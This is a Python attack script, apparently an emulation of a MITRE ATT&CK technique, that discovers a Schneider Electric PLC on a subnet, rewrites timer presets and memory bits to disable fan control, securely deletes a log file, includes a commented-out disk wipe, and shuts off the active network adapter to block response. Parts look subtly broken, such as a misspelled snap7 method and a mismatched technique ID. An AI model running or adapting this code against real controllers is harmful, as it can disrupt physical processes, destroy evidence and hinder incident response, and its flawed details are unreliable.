import snap7
import time
import os
import subprocess

# MITRE ATT&CK Technique: Inhibit Response Function (T1485)
# Sub-Technique: Data Destruction

# --- PLC Interaction Section ---
# PLC Connection Details
PLC_IP = "192.168.9.24"  #  Start with the IP address from the documentation.  Will be updated if necessary.
PLC_RACK = 0
PLC_SLOT = 1  # Corrected from 0 to 1 (typical for TM221)

# PLC Memory Addresses (from provided code)
M_ACTFAN_ADDRESS = 1  # %M1
M_TOG_ADDRESS = 2  # %M2
Q_FAN_ADDRESS_BYTE = 0
Q_FAN_ADDRESS_BIT = 0  # %Q0.0
COUNTER_ADDRESS = 0  # %C0
TIMER0_ADDRESS = 0 # %TM0
TIMER1_ADDRESS = 1 # %TM1


def find_plc_ip():
    """
    Attempt to discover the PLC's IP address if the default fails.
    This is a rudimentary approach and might need adjustment depending on the network.
    """
    try:
        #  Replace with a network scanning tool suitable for your environment.
        #  This example uses `nmap` (requires installation: `pip install python-nmap`)

        import nmap  # Import only if needed

        nm = nmap.PortScanner()
        nm.scan(
            "192.168.9.0/24", arguments="-sP"
        )  # Scan a subnet (adjust as needed)

        for host in nm.all_hosts():
            if "Schneider Electric" in nm[host]["osclass"].get("vendor", ""):
                print(f"Found Schneider Electric device at IP: {host}")
                return host
        print("Schneider Electric PLC not found on the network.")
        return None

    except ImportError:
        print(
            "nmap module not found. Install with: pip install python-nmap or provide a static ip."
        )
        return None
    except Exception as e:
        print(f"Error during IP discovery: {e}")
        return None


def connect_to_plc(ip, rack, slot):
    """Connects to the PLC using Snap7."""
    plc = snap7.client.Client()
    plc.set_asnyc_mode(False)  # disable async mode for reliability
    plc.connect(ip, rack, slot)
    if plc.get_connected():
        print(f"Successfully connected to PLC at {ip}")
        return plc
    else:
        print(f"Failed to connect to PLC at {ip}")
        return None


def write_memory_bit(plc, address, value):
    """Writes a boolean value to a memory bit in the PLC."""
    byte_address = address // 8
    bit_offset = address % 8
    read_data = plc.read_area(snap7.const.areas["MK"], 0, byte_address, 1) # Read 1 byte
    snap7.util.set_bool(read_data, 0, bit_offset, value)  # Modify the byte
    plc.write_area(snap7.const.areas["MK"], 0, byte_address, read_data)  # Write the modified byte back

def read_counter_value(plc, counter_address):
    """Reads the current value of a counter."""
    try:
        data = plc.read_area(snap7.const.areas["CT"], 0, counter_address, 2)  # Counters are typically 2 bytes (INT)
        counter_value = snap7.util.get_int(data,0)
        return counter_value
    except Exception as e:
        print(f"Error reading counter value: {e}")
        return None

def reset_counter(plc, counter_address):
    """Resets the counter in the PLC."""
    try:
      #Schneider PLCs do not have direct counter reset.
      #The counter counts when CU is TRUE and Q_FAN is FALSE

      # to reset the counter to 0, temporarily set Q_FAN to true, then set it back to false
      current_output = read_output_bit(plc, Q_FAN_ADDRESS_BYTE, Q_FAN_ADDRESS_BIT)
      write_output_bit(plc, Q_FAN_ADDRESS_BYTE, Q_FAN_ADDRESS_BIT, True)
      time.sleep(0.1)
      write_output_bit(plc, Q_FAN_ADDRESS_BYTE, Q_FAN_ADDRESS_BIT, current_output) #restore original value
      print(f"Counter {counter_address} reset.")
    except Exception as e:
        print(f"Error resetting counter {counter_address}: {e}")



def write_timer_preset(plc, timer_address, new_preset):
  """Writes a new preset value to a timer (in milliseconds)."""
  try:
      data = bytearray(4) #Timers are typically 4 bytes (DINT/DWORD)
      snap7.util.set_dword(data, 0, new_preset)
      plc.write_area(snap7.const.areas["TM"], 0, timer_address, data)
      print(f"Timer {timer_address} preset value changed to {new_preset} ms.")
  except Exception as e:
      print(f"Error writing timer preset: {e}")

def read_output_bit(plc, byte_address, bit_offset):
    """Reads the value of an output bit from the PLC."""
    try:
        data = plc.read_area(snap7.const.areas["PA"], 0, byte_address, 1)  # Read 1 byte
        return snap7.util.get_bool(data, 0, bit_offset)
    except Exception as e:
        print(f"Error reading output bit: {e}")
        return None

def write_output_bit(plc, byte_address, bit_offset, value):
    """Writes a boolean value to a digital output in the PLC."""
    try:
        read_data = plc.read_area(snap7.const.areas["PA"], 0, byte_address, 1)  # Read the byte
        snap7.util.set_bool(read_data, 0, bit_offset, value)  # Modify the byte
        plc.write_area(snap7.const.areas["PA"], 0, byte_address, read_data)  # Write it back
        print(f"Output %Q{byte_address}.{bit_offset} set to {value}")

    except Exception as e:
        print(f"Error writing to output %Q{byte_address}.{bit_offset}: {e}")

# --- Data Destruction Section ---
def secure_delete_file(filename):
    """
    Securely deletes a file using sdelete (if available) or a standard delete.
    """
    try:
        # Use Sysinternals SDelete for secure deletion (if available)
        subprocess.run(["sdelete", "-p", "3", "-s", filename], check=True, capture_output=True) # 3-pass secure delete
        print(f"Successfully sdeleted file: {filename}")
    except FileNotFoundError:
        print("SDelete not found.  Falling back to standard deletion.")
        os.remove(filename)
        print(f"Successfully deleted file: {filename}")
    except Exception as e:
        print(f"Error deleting file {filename}: {e}")

def wipe_disk_space(drive_letter):
    """
    Wipes free space on a drive using sdelete (if available).  This is time-consuming.
    """
    try:
        # Use Sysinternals SDelete to wipe free space on a drive
        subprocess.run(["sdelete", "-c", drive_letter], check=True, capture_output=True)
        print(f"Successfully wiped free space on drive: {drive_letter}")
    except FileNotFoundError:
        print("SDelete not found.")

    except Exception as e:
        print(f"Error wiping free space on drive {drive_letter}: {e}")

def create_dummy_file(filename, size_mb=10):
    """Creates a dummy file of the specified size (MB)."""
    try:
        with open(filename, "wb") as outfile:
            outfile.seek(size_mb * 1024 * 1024 - 1)  # Seek to the end of the file
            outfile.write(b"\0")  # Write a single byte to set the file size
        print(f"Dummy file created: {filename} ({size_mb} MB)")
    except Exception as e:
        print(f"Error creating dummy file: {e}")

def disable_network_adapter(adapter_name):
  """Disables a network adapter (requires admin privileges)."""
  try:
    subprocess.run(["netsh", "interface", "set", "interface", adapter_name, "admin=disabled"], check=True, capture_output=True)
    print(f"Network adapter '{adapter_name}' disabled.")
  except Exception as e:
    print(f"Error disabling network adapter '{adapter_name}': {e}")

# --- Main Execution ---
if __name__ == "__main__":
    # 1. IP Address Discovery (if needed)
    if PLC_IP == "192.168.9.24": #If still the default, attempt to find it.
        discovered_ip = find_plc_ip()
        if discovered_ip:
            PLC_IP = discovered_ip
        else:
            print("Using default IP address.  Connection may fail.")

    # 2. PLC Connection
    plc = connect_to_plc(PLC_IP, PLC_RACK, PLC_SLOT)

    if plc:
        try:
            # --- Inhibit Response Function: Actions to disrupt the fan control ---

            # A. Modify Timer Presets (Rendering timers ineffective)
            original_timer0_preset = 20000 # milliseconds
            original_timer1_preset = 20000 # milliseconds

            write_timer_preset(plc, TIMER0_ADDRESS, 60000) # Increase timer0 preset to 60 seconds
            write_timer_preset(plc, TIMER1_ADDRESS, 60000) # Increase timer1 preset to 60 seconds

            # B. Reset Counter (Preventing M_ACTFAN from being set)
            reset_counter(plc, COUNTER_ADDRESS)


            # C. Set M_TOG (Disabling fan activation logic)
            write_memory_bit(plc, M_TOG_ADDRESS, True)


            # --- Data Destruction Activities (Simulating Post-Intrusion Cleanup) ---

            # 1. Create a dummy log file.
            log_file = "plc_comms.log"
            create_dummy_file(log_file, size_mb=5) #5MB dummy file

            # 2. Securely delete the log file.
            secure_delete_file(log_file)


            # 3.  Wipe free space (Use with extreme caution, this can take a long time)
            #  This is commented out for safety.  Uncomment ONLY if you understand the risks.
            # wipe_disk_space("C:") #Wipe free space on C: drive.



            # 4. Disable Network Adapter to prevent response from engineering workstation
            # This requires the exact name of the adapter as shown in Network Connections.
            # Be very careful, as this will sever your connection.
            # The script will attempt to find and disable the active network connection.
            try:
                result = subprocess.run(["powershell", "(Get-NetAdapter | Where-Object {$_.Status -eq 'Up'}).Name"], capture_output=True, text=True, check=True)
                adapter_name = result.stdout.strip()

                if adapter_name:
                  disable_network_adapter(adapter_name)
                else:
                  print("No active network adapter found.  Cannot disable.")

            except subprocess.CalledProcessError as e:
                print(f"Error getting network adapter name: {e}")


            # 5.  Disconnect from PLC and restore timer presets.
            plc.disconnect()
            print("Disconnected from PLC")

            #Re-establish connection to restore Timer presets
            plc = connect_to_plc(PLC_IP, PLC_RACK, PLC_SLOT) #re-establish the connection
            if plc:

                write_timer_preset(plc, TIMER0_ADDRESS, original_timer0_preset) #Restore timer 0
                write_timer_preset(plc, TIMER1_ADDRESS, original_timer1_preset) #Restore timer 1
                write_memory_bit(plc, M_TOG_ADDRESS, False) #Set toggle off to false
                plc.disconnect()
                print("Restored timer presets and disconnected.")
            else:
                print("Could not re-establish connection to restore timer presets.") #notify if failed to reconnect

        except Exception as e:
            print(f"An error occurred: {e}")
        finally:

           if plc and plc.get_connected(): #only if the plc is connected.
                plc.disconnect()
                print("Disconnected from PLC (finally block).")
    else:
        print("Failed to establish connection to PLC.  Exiting.")